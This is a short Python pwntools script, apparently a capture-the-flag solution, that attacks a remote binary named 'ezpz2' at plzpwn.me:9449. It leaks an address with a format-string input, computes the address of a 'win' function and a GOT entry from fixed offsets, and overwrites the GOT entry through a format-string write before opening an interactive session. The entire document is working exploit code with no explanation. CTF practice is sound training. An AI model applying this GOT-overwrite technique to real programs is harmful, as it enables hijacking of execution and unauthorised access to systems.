from pwn import *

context.log_level = 'debug'
# p = process('./ezpz2')
p = remote("plzpwn.me","9449")
q = p.recv()
p.sendline('n')
q = p.recv()
q = p.recv()
print "should enter answer now"
fmt = "AAAA.%1$x"
p.sendline(fmt)
q = p.recv()
p.sendline('A')
q = p.recvuntil(".")
ad = p.recvline()[:-1]
winAd = int(ad,16)-10260
gotAd = winAd+9605
log.info("winAd: " + hex(winAd))
log.info("gotAd: " + hex(gotAd))
p.recv()
p.sendline('n')
p.recv()
def pay(q):
    p.sendline(q)
    log.info(repr(q))
form = FmtStr(execute_fmt=pay, offset=8, padlen=3)
form.write(gotAd, winAd)
form.execute_writes()
p.interactive()


